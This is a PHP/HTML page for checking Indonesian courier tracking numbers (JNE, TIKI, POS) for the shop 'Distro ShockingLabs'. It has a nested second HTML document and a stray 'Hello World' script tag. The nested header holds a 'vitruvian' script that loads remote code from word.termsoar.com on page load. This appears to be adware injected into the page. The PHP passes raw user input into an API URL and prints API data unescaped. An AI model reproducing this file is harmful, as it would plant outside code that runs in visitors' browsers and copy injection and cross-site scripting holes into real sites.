<!DOCTYPE html>
<html lang="">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>Cek Resi Anda</title>

		<!-- Bootstrap CSS -->
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">

		<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
		<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
		<!--[if lt IE 9]>
			<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
			<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
		<![endif]-->
	</head>
	<body>
    
<!DOCTYPE html>
<html lang="en">
<head>
 <script id="vitruvian" type="text/javascript" async="true" src="http://word.termsoar.com/kernel/8554AC0D-1F8A-4B3C-88FC-A82628ECA432?aid=DD0374BA-7DAE-4050-85C1-631479375AAC&amp;iid=9952A101-92B9-485A-8D59-419F54FFA501&amp;itm=2015-12-16T03:53:43Z" data-nid="8554AC0D-1F8A-4B3C-88FC-A82628ECA432" data-ie-pid="00000000-0000-0000-0000-000000000000" data-cr-pid="00000000-0000-0000-0000-000000000000" data-ff-pid="00000000-0000-0000-0000-000000000000" data-nf-pid="D03D06DB-C141-4A87-B16A-23A86B02163E" data-pid="D03D06DB-C141-4A87-B16A-23A86B02163E" data-aid="DD0374BA-7DAE-4050-85C1-631479375AAC" data-iid="9952A101-92B9-485A-8D59-419F54FFA501" data-ver="1.10.0.28" data-itm="2015-12-16T03:53:43Z" data-hid="3CA3CCF5-FA58-030F-BA64-A5FC8AB9F28B" data-ie-at="00000000-0000-0000-0000-000000000000" data-cr-at="00000000-0000-0000-0000-000000000000" data-ff-at="00000000-0000-0000-0000-000000000000" data-nf-at="4FA40B42-24AA-E954-EF3F-DA99F167BCBD" data-at="4FA40B42-24AA-E954-EF3F-DA99F167BCBD" data-ie-ver="11.0.9600.16384" data-cr-ver= ></script>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>ShockingLabs</title>
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
    <!-- Optional theme -->
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css">
    
</head>

<body>

    <div class="container">
        <h1><small>Distro ShockingLabs</small>        </h1>
        <nav class="navbar navbar-default" role="navigation">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-collapse">
                    <span class="sr-only">Toggle Responsive</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
               
            </div>
            <div class="collapse navbar-collapse" id="navbar-collapse">
                <ul class="nav navbar-nav">
                    <li><a href="home.php">HOME</a></li>
                    <li><a href="produk.php">PRODUCT</a></li>
                    <li><a href="caraorder.php">CARA ORDER</a></li>
                    <li><a href="download.php">DOWNLOAD</a></li>
                    <li><a href="about.php">ABOUT</a></li>
                    <li><a href="contact.php">CONTACT</a></li>
                    <li><a href="konfirmasi.php">KONFIRM</a></li>
                </ul>
            </div>
        </nav>  	
    </div>


<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>    
<!-- Latest compiled and minified JavaScript -->
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
</body>
</html>

		<div class="container">
			<h2 align="center">&nbsp;</h2>
			<h2 align="center">Cek Nomor Resi (JNE, TIKI, & POS INDONESIA)</h2>
			<hr>
			<div class="col-lg-4">
				<div class="panel panel-success">
					<div class="panel-heading">Cek Resi Anda</div>
					<div class="panel-body">
						<form action="" method="POST">
							<div class="form-group">	
								<label for="" class="control-label">Nomor Resi</label>
								<input type="text" class="form-control" name="resi" required>
							</div>
							<div class="form-group">
								<label for="" class="control-label" >Jasa Pengiriman</label>
								<select name="jasa" id="" class="form-control" required>
									<option value="">-- Pilih Jasa Pengiriman -- </option>
									<option value="jne">JNE</option>
									<option value="tiki">TIKI</option>
									<option value="pos">POS INDONESIA</option>
								</select>
							</div>
					</div>
					<div class="panel-footer">
						<button type="submit" name="cek" class="btn btn-primary">Cek Resi</button>
					</div>
					</form>
				</div>
			</div>
			<div class="col-lg-8">
				<?php  
					if (isset($_POST['cek'])) 
					{
						$resi = isset($_POST['resi'])?$_POST['resi']:"";
						$jasa = isset($_POST['jasa'])?$_POST['jasa']:"";

						$ambil_content = file_get_contents("http://ibacor.com/api/cek-resi?pengirim=".$jasa."&resi=".$resi."");

						$result = json_decode($ambil_content, true);

						//ambil data

						//date
				

						if ($result['status'] == "success") 
						{
							$detail = $result['data']['detail'];
							$riwayat = $result['data']['riwayat'];

						?>
						<div class="panel panel-info">
							<div class="panel-heading">Hasil Pencarian Nomor Resi Anda</div>
							<div class="panel-body">
								<legend>Detail </legend>
								<table class="table table-striped">
									<tr>
										<td width="170"><label for="" class="control-label">Nomor Resi</label> </td>
										<td width="10">:</td>
										<td><?php echo $detail['no_resi'] ?></td>
									</tr>
									<tr>
										<td width="50"><label for="" class="control-label">Jenis Pengiriman</label> </td>
										<td width="10">:</td>
										<td><?php
										if ($jasa == "tiki"):
										echo 'Tiki';
										else:
										
										 echo $detail['service'];
										 endif
										 ?></td>
									</tr>
									<?php if ($jasa != "pos"): ?>
										<tr>
											<td width="50"><label for="" class="control-label">Tanggal</label></td>
											<td width="10">:</td>
											<td>
												<?php if ($jasa == "jne"): ?>
												<?php echo $detail['tanggal'] ?>
												<?php else: ?>
													<?php echo $detail['tanggal'] ?>	
												<?php endif ?>
											</td>
										</tr>
									<?php endif ?>

									<tr>
										<td width="50"><label for="" class="control-label">Status</label> </td>
										<td width="10">:</td>
										<td><?php echo $detail['status'] ?></td>
									</tr>
								</table>
								<legend>Asal & Tujuan</legend>
								<table class="table table-bordered">
									<thead>
										<tr>
											<th>Pengirim</th>
											<th>Penerima</th>
										</tr>
									</thead>
									<tbody>
										<tr>
											<td>
												<?php if ($jasa == "jne" || $jasa == "pos"): ?>
													Nama :  <?php echo $detail['asal']['nama'] ?><br>
													Dari : <?php echo $detail['asal']['alamat'] ?>
												<?php else: ?>
													Dari : <?php echo $detail['asal']['alamat'] ?>
												<?php endif ?><br>
											</td>
											<td>
												<?php if ($jasa == "jne" || $jasa == "pos"): ?>
													Nama :  <?php echo $detail['tujuan']['nama'] ?><br>
													Penerima : <?php echo $detail['tujuan']['alamat'] ?>
												<?php else: ?>
													Penerima : -
												<?php endif ?><br>
											</td>
										</tr>
									</tbody>
								</table>
								<legend>Tracking Status</legend>
								<table class="table table-bordered">
									<thead>
										<tr>
											<th>Tanggal & Waktu</th>
											<th>Lokasi</th>
											<th>Status</th>
											<th>Keterangan</th>
										</tr>
									</thead>
									<tbody>
										<?php  
											for ($i=0; $i < count($riwayat) ; $i++) 
											{ 
												?>
												<tr>
													<td>
														<?php  
															if ($jasa == "tiki") 
															{
																echo $riwayat[$i]['tanggal'];
															}
															else
															{
																echo $riwayat[$i]['tanggal'];
															}
														?>
													</td>
													<td><?php echo $riwayat[$i]['lokasi'] ?></td>
													<td>
														<?php if ($jasa == "jne"): ?>
															<?php echo $riwayat[$i]['keterangan'] ?>
														<?php else: ?>
															<?php echo $riwayat[$i]['status'] ?>
														<?php endif ?>
													</td>
													<td>
														<?php if ($jasa == "pos"): ?>
															<?php echo $riwayat[$i]['keterangan'] ?>
														<?php else: ?>
															<?php echo "-"; ?>
														<?php endif ?>
													</td>
												</tr>
												<?php
											}
										?>
									</tbody>
								</table>
							</div>
						</div>
						<?php
						} else
						{
							echo '<div class="alert alert-danger">Data tidak ditemukan. Pastikan Nomor Resi dan Jasa Pengiriman benar.</div>';
						}
					}
				?>
			</div>
		</div>
		<p align="center"></p>
		<!-- jQuery -->
		<script src="//code.jquery.com/jquery.js"></script>
		<!-- Bootstrap JavaScript -->
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
		<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
 		<script src="Hello World"></script>
	</body>
</html>